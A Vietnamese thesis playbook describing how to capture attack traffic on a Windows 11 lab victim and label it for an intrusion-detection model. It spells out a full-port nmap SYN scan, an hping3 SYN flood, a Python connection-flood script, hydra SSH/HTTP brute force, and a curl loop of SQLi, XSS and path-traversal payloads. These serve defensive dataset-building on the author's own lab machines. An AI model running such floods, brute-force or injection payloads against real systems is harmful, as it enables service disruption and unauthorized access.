# Hướng dẫn thu dữ liệu TẤN CÔNG — bắt gói phía Windows (victim Win11) — step by step

**Thuộc:** Playbook cải thiện model live — [HUONG_DAN_CAI_THIEN_MODEL_LIVE.md](HUONG_DAN_CAI_THIEN_MODEL_LIVE.md) · **Bước 0 (Phiên 2 — tấn công)**.
**Bổ trợ cho:** [HUONG_DAN_THU_DU_LIEU_BENIGN.md](HUONG_DAN_THU_DU_LIEU_BENIGN.md) (phiên benign, bắt gói trong WSL).
**Mục tiêu:** có `data/analysis/<attack>_real.csv` (nhãn sạch) làm nền cho **Bước 3 (kiểm chứng)** và **Bước 5 (fine-tune)**.

---

## 0. Vì sao phiên tấn công KHÔNG bắt gói trong WSL (khác phiên benign)

Phiên **benign** bắt gói bằng `tcpdump` trong WSL được, vì traffic benign **sinh ra từ chính WSL** (curl/apt/…) nên đi qua `eth0` của WSL.

Phiên **tấn công** thì **ngược lại**: attacker bắn từ ngoài vào **dịch vụ của victim**. Thực nghiệm cho thấy:

- Victim WSL ở chế độ **mirrored** (`eth0 = 192.168.0.103/24`) **chỉ nhận** gói tới **đúng cổng WSL đang mở và qua được Windows Firewall**.
- Gói tới **cổng đóng** hoặc **cổng do Windows sở hữu** (135/139/445/5432…) bị Windows xử lý/drop **trước khi tới WSL** → `tcpdump` trong WSL **không thấy**.
- PortScan bản chất là bắn tới **hàng nghìn cổng đóng** → gần như **toàn bộ vô hình** với WSL (bằng chứng: 1 phiên chỉ bắt được ~1.2k packet trong khi tấn công sinh ~250k packet).

> **Kết luận:** phải **bắt gói ngay tại card mạng Windows** (Npcap/`dumpcap`) — nó thấy **mọi gói** bất kể firewall/cổng. Sau đó vẫn đưa vào **cfm (CICFlowMeter V4)** offline như cũ → CSV **84 cột**, parity với dataset train, 0 domain shift.

```
[Attacker WSL-NAT] --SNAT--> [Attacker Windows 192.168.0.106] --LAN--> [Victim Windows 192.168.0.103]
                                                                              │ dumpcap (Npcap) bắt tại card Wi-Fi
                                                                              ▼  C:\cap\atk.pcap
                                                                     (copy vào WSL: /mnt/c/cap/atk.pcap)
                                                                              │  cfm offline
                                                                              ▼  data/live/atk.pcap_Flow.csv (84 cột)
                                                                              │  consolidate_attack.py (lọc Src IP + tách cổng)
                                                                              ▼  data/analysis/{portscan,dos,brute_force,web_attack}_real.csv
```

---

## 1. Topology & IP (đã chốt)

| Vai trò | Máy | IP dùng để tấn công / nhãn |
|---|---|---|
| **Attacker** | Win10, WSL‑NAT `172.20.194.130` → SNAT qua Wi‑Fi | victim thấy **`192.168.0.106`** |
| **Victim** | Win11, WSL mirrored `eth0 = 192.168.0.103/24` | **`192.168.0.103`** |

- Attacker đứng sau WSL‑NAT nên gói ra LAN **bị đổi IP nguồn thành `192.168.0.106`** (Wi‑Fi của host). Victim luôn thấy `Src IP = 192.168.0.106` → dùng IP này để **gán nhãn**.
- `replay_config.json` phải khớp: `attacker_ip = 192.168.0.106`, `victim_ip = 192.168.0.103`.

```bash
# trên attacker (WSL) — xác nhận IP host ra LAN:
powershell.exe -NoProfile -Command "Get-NetIPAddress -AddressFamily IPv4 | Where {\$_.IPAddress -like '192.168.*'} | Select IPAddress,InterfaceAlias"
```

---

## 2. Chuẩn bị (làm 1 lần)

> **✅ Máy VICTIM này đã xác minh sẵn sàng (2026-07-03):**
> - Wi-Fi = `192.168.0.103/24` (đúng `victim_ip`) — **bắt gói trên card `Wi-Fi`**. Máy còn 1 card `Ethernet 192.168.1.2` khác subnet, **bỏ qua** (attacker `192.168.0.106` đi qua Wi-Fi).
> - `dumpcap` Wireshark 4.6.6 + Npcap (Running) — đã cài. Thư mục `C:\cap` — đã tạo.
> - WSL `Ubuntu-20.04` (user `ning`): java 1.8 OK, `cfm` OK, ghi được vào repo qua `/mnt/d/…`.
> - **Đường dẫn repo trong WSL:** `"/mnt/d/ĐỒ ÁN/graduation-thesis/live_detection"` (project nằm trên D:, không có bản copy trong WSL home — luôn để trong ngoặc kép vì path có dấu cách).
>
> Các bước 2.1–2.4 dưới đây là để tái lập trên máy khác; máy này chỉ cần chuyển thẳng sang **mục 3**.

### 2.1 VICTIM (Windows) — công cụ bắt gói
1. Cài **Wireshark** (kèm **Npcap**): https://www.wireshark.org/download.html
   → khi cài Npcap, bật *"Install Npcap in WinPcap API-compatible Mode"*.
2. Kiểm `dumpcap` chạy được + tìm tên interface LAN (thường `Wi-Fi`):
   ```powershell
   & "C:\Program Files\Wireshark\dumpcap.exe" -D
   ```
   Ghi nhớ tên interface mang IP `192.168.0.103` (vd `Wi-Fi`).
3. Tạo thư mục chứa pcap (ổ C để WSL đọc qua `/mnt/c`):
   ```powershell
   mkdir C:\cap
   ```
> Mẹo: thêm `C:\Program Files\Wireshark` vào PATH để gõ `dumpcap` gọn. Nếu không, dùng đường dẫn đầy đủ như trên.

### 2.2 VICTIM (WSL) — cfm để trích xuất flow
```bash
command -v java || echo "!! cai: sudo apt install -y openjdk-8-jre"
CFM_BIN="${CFM_BIN:-/home/ning/CICFlowMeter/build/distributions/CICFlowMeter-4.0/bin/cfm}"
[ -x "$CFM_BIN" ] && echo "OK cfm: $CFM_BIN" || { echo "!! khong thay cfm, tim:"; find / -iname cfm -type f 2>/dev/null | head; }
# cfm o cho khac: export CFM_BIN=/duong/dan/toi/cfm
```

### 2.3 ATTACKER (WSL) — công cụ tấn công
```bash
command -v nmap  || sudo apt install -y nmap
command -v hping3 || sudo apt install -y hping3          # chi can neu dung bien the SYN (can sudo)
ping -c 2 192.168.0.103                                   # phai thay victim
```

### 2.4 Chốt IP trong config (nguồn chân lý)
```bash
cd "/mnt/d/ĐỒ ÁN/graduation-thesis/live_detection"
grep -E 'attacker_ip|victim_ip' replay_config.json
# phai la: attacker_ip=192.168.0.106  victim_ip=192.168.0.103  (sua neu khac)
```

### 2.5 VICTIM (Windows) — dựng dịch vụ cho **Brute Force** & **Web Attack**

> Chỉ cần nếu thu **đầy đủ 4 lớp**. Victim mặc định chỉ mở `445` (cho DoS) — PortScan không cần dịch vụ. **Brute Force cần cổng 22 (SSH), Web Attack cần cổng 80 (HTTP)**, và phải dựng trên **Windows** (WSL không reachable từ LAN). Mỗi lớp một cổng riêng để **gán nhãn theo cổng**.

**SSH cổng 22 (cho Brute Force)** — bật OpenSSH Server, chạy PowerShell **admin**:
```powershell
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
Start-Service sshd; Set-Service -Name sshd -StartupType Automatic
New-NetFirewallRule -DisplayName "atk-ssh-22" -Direction Inbound -Action Allow -Protocol TCP -LocalPort 22
```

**HTTP cổng 80 (cho Web Attack)** — chạy web server đơn giản (giữ cửa sổ mở suốt phiên):
```powershell
New-NetFirewallRule -DisplayName "atk-http-80" -Direction Inbound -Action Allow -Protocol TCP -LocalPort 80
python -m http.server 80            # cổng 80 bận thì dùng 8080 (nhớ đổi cổng Web Attack cho khớp)
```

**Xác nhận từ máy ATTACKER** (cả 3 cổng phải `open`/có phản hồi):
```bash
nmap -sT -Pn -p22,80,445 192.168.0.103
curl -m3 -o /dev/null -w "http %{http_code}\n" http://192.168.0.103:80
```
> Nếu 22/80 vẫn `closed` từ attacker → dịch vụ chưa chạy hoặc firewall chặn; sửa xong mới bắn Brute Force/Web Attack (nếu không hydra/curl bị "refused", không sinh traffic).

---

## 3. GIAI ĐOẠN 1 — Bật bắt gói (VICTIM / Windows)

Chạy **trước** khi tấn công. Lọc đúng traffic attacker để nhãn sạch, ghi **pcap cổ điển** (`-P`) cho cfm đọc:

```powershell
# Máy này: interface = "Wi-Fi", dumpcap KHÔNG trên PATH -> dùng đường dẫn đầy đủ:
& "C:\Program Files\Wireshark\dumpcap.exe" -i "Wi-Fi" -P -f "host 192.168.0.106" -w C:\cap\atk.pcap
```
- `-P` : ghi định dạng **pcap** (không phải pcapng) → cfm V4 đọc được.
- `-f "host 192.168.0.106"` : chỉ bắt gói đi/đến attacker → loại nhiễu benign, nhãn sạch.
- Để chạy tới khi tấn công xong; **`Ctrl-C` để dừng** (Giai đoạn 3).

> Muốn xoay file theo thời gian (phiên dài): thêm `-b duration:60` → sinh `atk_00001_*.pcap`, `atk_00002_*.pcap`…

---

## 4. GIAI ĐOẠN 2 — Phát động tấn công ĐẦY ĐỦ 4 lớp (ATTACKER)

Thu đủ **4 lớp tấn công** model V8.5 phân loại (theo `label_map`): **PortScan · DoS · Brute Force · Web Attack**. Mỗi lớp đánh vào **một cổng đích riêng** → gán nhãn theo cổng (mục 6), **không cần canh giờ**.

| Lớp | Cổng đích | Cần dịch vụ victim (mục 2.5) |
|---|---|---|
| PortScan | cả dải 1–65535 | không |
| DoS | 445 | 445 đã mở |
| Brute Force | 22 (SSH) | OpenSSH Server |
| Web Attack | 80 (HTTP) | web server |

> Chạy **lần lượt**, chờ lệnh trước xong mới sang lệnh sau. Thứ tự không quan trọng (tách theo cổng). Đặt `VICTIM=192.168.0.103` một lần.

### 4.1 PortScan (cả dải cổng)
```bash
VICTIM=192.168.0.103
sudo nmap -sS -T4 -p1-65535 -Pn "$VICTIM"      # SYN scan — giống CIC (cần sudo)
# không có sudo:  nmap -sT -T4 -p1-65535 -Pn "$VICTIM"
```

### 4.2 DoS (cổng 445)
```bash
sudo hping3 --flood -S -p 445 "$VICTIM"        # SYN flood — chạy ~30s rồi Ctrl-C
```
Không có sudo → connection flood không‑root:
```bash
python3 - "$VICTIM" <<'PY'
import socket, sys, time, threading
host=sys.argv[1]; end=time.time()+30; n=[0]; lock=threading.Lock()
def w():
    while time.time()<end:
        try:
            s=socket.socket(); s.settimeout(1); s.connect((host,445)); s.close()
            with lock: n[0]+=1
        except Exception: pass
ts=[threading.Thread(target=w) for _ in range(60)]
[t.start() for t in ts]; [t.join() for t in ts]
print(f"[flood] {n[0]} ket noi trong ~30s")
PY
```

### 4.3 Brute Force (cổng 22 — cần SSH ở mục 2.5)
```bash
sudo apt install -y hydra
seq 1 400 | sed 's/^/pass/' > /tmp/wl.txt                     # wordlist gọn 400 mật khẩu (bounded)
hydra -l admin -P /tmp/wl.txt -t 4 ssh://"$VICTIM"            # SSH-Patator
```
> Dùng wordlist nhỏ để hydra chạy dứt điểm (rockyou 14M sẽ chạy rất lâu). ~400 lần thử đủ tạo mẫu Brute Force.

### 4.4 Web Attack (cổng 80 — cần HTTP ở mục 2.5)
```bash
# a) Brute login (HTTP) — nhiều request cổng 80
hydra -l admin -P /tmp/wl.txt -t 4 "http-get://$VICTIM/"     # bo qua neu server khong doi auth
# b) Chuỗi payload SQLi/XSS — sinh nhiều flow cổng 80 mang đặc trưng Web Attack
for i in $(seq 1 400); do
  curl -s -m2 -o /dev/null "http://$VICTIM/?id=1'%20OR%20'1'='1"          # SQLi
  curl -s -m2 -o /dev/null "http://$VICTIM/search?q=<script>alert(1)</script>"  # XSS
  curl -s -m2 -o /dev/null "http://$VICTIM/../../etc/passwd"              # path traversal
done
```

### 4.5 (tuỳ chọn) Tự chấm giờ — chỉ khi muốn gán nhãn theo thời gian
> Không cần nếu mỗi lớp đánh 1 cổng riêng (gán theo cổng ở mục 6, bất biến đồng hồ). Chỉ dùng khi **một cổng chạy nhiều loại**.
```bash
PAD=5; MARKS=~/attack_windows.txt; : > "$MARKS"
atk(){ label="$1"; shift; s=$(date -d "-$PAD sec" '+%Y-%m-%d %H:%M:%S'); "$@";
       e=$(date -d "+$PAD sec" '+%Y-%m-%d %H:%M:%S');
       printf '    ("%s", "%s", "%s"),\n' "$label" "$s" "$e" | tee -a "$MARKS"; }
```
> ⚠️ Giờ theo **đồng hồ attacker**; timestamp CSV theo **đồng hồ victim (Windows, nơi dumpcap ghi)**. Hai máy phải cùng giờ + timezone (`date '+%F %T %Z'`). Lệch → dùng tách theo cổng.

---

## 5. GIAI ĐOẠN 3 — Dừng bắt gói + trích xuất flow (VICTIM)

### 5.1 Dừng dumpcap (Windows)
Về cửa sổ PowerShell đang chạy `dumpcap` → **`Ctrl-C`**. Kiểm file:
```powershell
dir C:\cap
```

### 5.2 Đưa pcap vào cfm (WSL) → CSV 84 cột
```bash
cd "/mnt/d/ĐỒ ÁN/graduation-thesis/live_detection"
CFM_BIN="${CFM_BIN:-/home/ning/CICFlowMeter/build/distributions/CICFlowMeter-4.0/bin/cfm}"
mkdir -p data/live
# pcap tren C:\cap thay o /mnt/c/cap trong WSL
"$CFM_BIN" /mnt/c/cap/atk.pcap "$PWD/data/live"
# neu xoay nhieu file: lap qua tung .pcap
# for p in /mnt/c/cap/*.pcap; do "$CFM_BIN" "$p" "$PWD/data/live"; done
ls -1 data/live/*_Flow.csv
```
> cfm sinh `atk.pcap_Flow.csv` trong `data/live/`. Đây là input cho bước gán nhãn.

---

## 6. GIAI ĐOẠN 4 — Gán nhãn sạch (VICTIM / WSL)

Nhãn sạch = **lọc `Src IP == 192.168.0.106`** (chỉ traffic attacker) rồi **tách loại tấn công theo cổng đích** (bất biến đồng hồ).

### 6.1 Cách A — script có sẵn (khuyến nghị, gán THUẦN THEO CỔNG)
[training/consolidate_attack.py](training/consolidate_attack.py) đã cấu hình sẵn `PORT_LABELS` cho phiên 4 lớp — **không cần sửa gì** nếu bạn đánh đúng cổng ở mục 4:
```python
PORT_LABELS = {80: "Web Attack", 22: "Brute Force", 445: "DoS"}   # còn lại -> PortScan
```
Chạy:
```bash
python3 training/consolidate_attack.py
```
Script lọc `Src IP == attacker_ip` (tự đọc từ `replay_config.json`), gán nhãn theo cổng đích, kiểm 84 cột/NaN/inf, xuất `data/analysis/{portscan,dos,brute_force,web_attack}_real.csv`.
> Cổng ≠ 80/22/445 → PortScan. PortScan lỡ trúng 80/22/445 (mỗi cổng 1 flow) sẽ bị gộp vào lớp tương ứng — không đáng kể.

### 6.2 Cách B — một lệnh tự chứa (không cần file script)
```bash
cd "/mnt/d/ĐỒ ÁN/graduation-thesis/live_detection"
python3 - <<'PY'
from pathlib import Path
import numpy as np, pandas as pd, glob, sys
OUT=Path("data/analysis"); OUT.mkdir(parents=True,exist_ok=True)
ATTACKER="192.168.0.106"
PORT_LABELS={80:"Web Attack", 22:"Brute Force", 445:"DoS"}   # con lai -> PortScan
fs=glob.glob("data/live/*.csv")+glob.glob("data/live/processed/*.csv")
if not fs: sys.exit("[!] Khong co CSV trong data/live/. Da chay cfm chua?")
df=pd.concat([pd.read_csv(f,low_memory=False).rename(columns=str.strip) for f in fs],ignore_index=True)
def pick(*c):
    low={x.lower().strip():x for x in df.columns}
    for k in c:
        if k in low: return low[k]
src=pick("src ip","source ip","src_ip"); dpt=pick("dst port","destination port","dst_port")
if not src or not dpt: sys.exit(f"[!] Thieu cot Src IP/Dst Port. Co: {list(df.columns)[:12]}")
atk=df[df[src].astype(str).str.strip()==ATTACKER].copy()
print(f"[*] Tong {len(df)} flow | tu attacker {ATTACKER}: {len(atk)}")
if atk.empty:
    print(df[src].astype(str).str.strip().value_counts().head(8)); sys.exit("[!] 0 flow tu attacker.")
port=pd.to_numeric(atk[dpt],errors="coerce")
atk["Label"]=port.map(PORT_LABELS).fillna("PortScan")
print(atk["Label"].value_counts().to_string())
n=atk.select_dtypes(include=[np.number])
print(f"[*] Cot(khong Label)={atk.shape[1]-1} (train=84) | NaN={int(n.isna().sum().sum())} inf={int(np.isinf(n.to_numpy(float,na_value=0)).sum())}")
for name,g in atk.groupby("Label"):
    f=OUT/f"{name.lower().replace(' ','_')}_real.csv"; g.to_csv(f,index=False); print(f"[+] {f.name}: {len(g)} flow")
PY
```

### 6.3 Kiểm kết quả
```bash
ls -lh data/analysis/*_real.csv
wc -l data/analysis/portscan_real.csv data/analysis/dos_real.csv data/analysis/brute_force_real.csv data/analysis/web_attack_real.csv 2>/dev/null
```

---

## 7. Tiêu chí Done (Phiên 2 — đầy đủ 4 lớp)
- [ ] Mục 2.5: `nmap -p22,80,445` từ attacker thấy **cả 3 cổng open** (nếu thu Brute Force + Web Attack).
- [ ] `dumpcap` bắt được **>> vài nghìn packet** (không phải ~1k như bắt trong WSL) — kiểm `dir C:\cap` thấy file lớn.
- [ ] cfm sinh `*_Flow.csv` **84 cột** trong `data/live/`.
- [ ] `consolidate_attack.py` báo **>0 flow từ 192.168.0.106** và in đủ 4 nhãn.
- [ ] `data/analysis/` có **`portscan_real.csv`, `dos_real.csv`, `brute_force_real.csv`, `web_attack_real.csv`** — nhãn khớp `label_map` model.
- [ ] Lưu ý cân bằng: DoS/PortScan thường **áp đảo** Brute Force/Web Attack → khi fine-tune nên undersample.

---

## 8. Cạm bẫy thường gặp
- **Bắt gói trong WSL cho tấn công** → chỉ thấy ~1k packet (WSL mù với gói tới cổng Windows/đóng). **Phải** dùng `dumpcap` trên Windows.
- **Quên `-P`** → dumpcap ghi pcapng, cfm V4 có thể không đọc. Luôn `-P`.
- **Quên `-f "host 192.168.0.106"`** → pcap dính benign của cả LAN → bẩn nhãn.
- **Sai tên interface** (`dumpcap -i`) → bắt nhầm card không có traffic. Kiểm `dumpcap -D`, chọn card mang IP `192.168.0.103`.
- **0 flow từ attacker** → attacker_ip sai (NAT ánh xạ IP khác `.106`): xem danh sách Src IP script in ra, cập nhật `replay_config.json`.
- **DoS áp đảo PortScan** (vd 50k vs 2k) → khi fine-tune nên **undersample** lớp DoS cho cân bằng.
- **Lệch timezone 2 máy** (nếu gán nhãn theo thời gian) → dùng **tách theo cổng** (mục 6) để khỏi phụ thuộc đồng hồ.
- **cfm chunk quá ngắn** không phải vấn đề ở đây (bắt cả phiên vào 1 pcap); nhưng pcap quá lớn → dùng `-b duration:60` xoay file rồi lặp cfm.

---

## 9. Bước tiếp theo
Có `<attack>_real.csv` (+ `benign_real.csv`/`benign_val.csv` từ Phiên 1) → sang:
- **Bước 3 — Kiểm chứng:** đưa flow tấn công thật qua model V8.5, đo recall/nhầm lẫn theo lớp.
- **Bước 5 — Fine-tune:** trộn benign thật + attack thật (cân bằng lớp) để giảm covariate shift.

Chi tiết trong [HUONG_DAN_CAI_THIEN_MODEL_LIVE.md](HUONG_DAN_CAI_THIEN_MODEL_LIVE.md).
